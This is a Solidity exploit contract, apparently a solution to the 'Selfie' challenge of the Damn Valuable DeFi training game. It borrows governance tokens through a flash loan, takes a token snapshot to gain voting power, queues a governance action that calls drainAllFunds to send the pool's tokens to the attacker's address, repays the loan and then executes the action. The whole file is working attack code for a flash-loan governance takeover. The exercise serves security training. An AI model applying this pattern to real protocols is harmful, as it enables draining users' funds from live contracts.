//SPDX-License-Identifier MIT

pragma solidity ^0.8.0;

import "./SelfiePool.sol";
import "hardhat/console.sol";
import "./SimpleGovernance.sol";
import "./DamnValuableTokenSnapshot.sol";

contract Exploit {
    SelfiePool public immutable selfiePool;
    SimpleGovernance public immutable simpleGovernance;
    DamnValuableTokenSnapshot public immutable token;
    address public immutable owner;
    uint256 public actionId;

    constructor(
        address _selfiePool,
        address _simpleGovernance,
        address _token,
        address _owner
    ) {
        selfiePool = SelfiePool(_selfiePool);
        simpleGovernance = SimpleGovernance(_simpleGovernance);
        token = DamnValuableTokenSnapshot(_token);
        owner = _owner;
    }

    function getFlashLoan(uint256 amount) external {
        selfiePool.flashLoan(amount);
    }

    function receiveTokens(address _token, uint256 _amount) external {
        //Queue an action to run drainall and send the tokens to attacker
        // function queueAction(
        //     address receiver, -> selfiepool
        //     bytes calldata data, -> call function drainAllFunds(address receiver) external onlyGovernance  -> reciever is attacker address
        //     uint256 weiAmount -> 50000

        token.snapshot();
        actionId = simpleGovernance.queueAction(
            address(selfiePool),
            abi.encodeWithSignature("drainAllFunds(address)", owner),
            0
        );

        //return the loan back
        token.transfer(address(selfiePool), _amount);
    }

    function Execute() public {
        simpleGovernance.executeAction(actionId);
    }

    receive() external payable {}
}
